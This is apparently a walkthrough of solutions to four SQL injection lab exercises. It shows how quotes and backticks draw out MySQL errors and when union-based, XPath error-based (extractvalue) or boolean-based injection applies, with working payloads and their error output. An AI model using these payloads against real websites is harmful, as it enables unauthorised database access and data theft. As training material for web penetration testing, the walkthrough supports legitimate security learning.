Solutions of Mics Injections:
(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html)

#1.
+ Put single quote at the end of url, get SQL error:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
So, we don't need to add special characters (' or " or ) or `)
+ Try union-based injection:
Try ...?id=1 order by 10 --+- get error:
"Error While Selection process : Unknown column '10' in 'order clause'"
So, we can use union-based injection to find information of DB.
(See basicinjections.txt for more details)

#2.
+ Put single quote at the end of url, get error:
"Error While Selection process : Unknown column 'id'' in 'group statement'"
Guess SQL query has group by clause
+ Put ` at the end of url, get SQL error:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`id``' at line 1"
To fix error, add --+- at the end of url(...?id=1` --+-)
+ Try union-based injection:
Try ...?id=1` order by 10 --+- get error:
"Error While Selection process : Unknown column '10' in 'order clause'"
So, we can use union-based injection to find information of DB.
(See basicinjections.txt for more details)

#3.
+ Put single quote at the end of url, get error:
"Error While Selection process : Unknown column 'id'' in 'order clause'"
Guess SQL query has order by clause
+ Put ` at the end of url, get SQL error:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`id``' at line 1"
To fix error, add --+- at the end of url(...?id=1` --+-)
+ Try union-based injection:
Try ...?id=1` order by 10 --+- get error:
"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by 1 -- -`' at line 1"
So, we cannot use union-based injection
+ Try XPath injection:
Try ...?id=1` and extractvalue(0, concat(0, (select database()))) --+-
get error: "Error While Selection process : XPATH syntax error: 'leettime_761wHole'"
So, we can use XPath injection to find information in DB
(See XPathinjections.txt for more details)

#4.
+ When add characters at the end of url, we only see 2 different messages.
So, we can use boolean-based injection
...?id=1` ... --+-
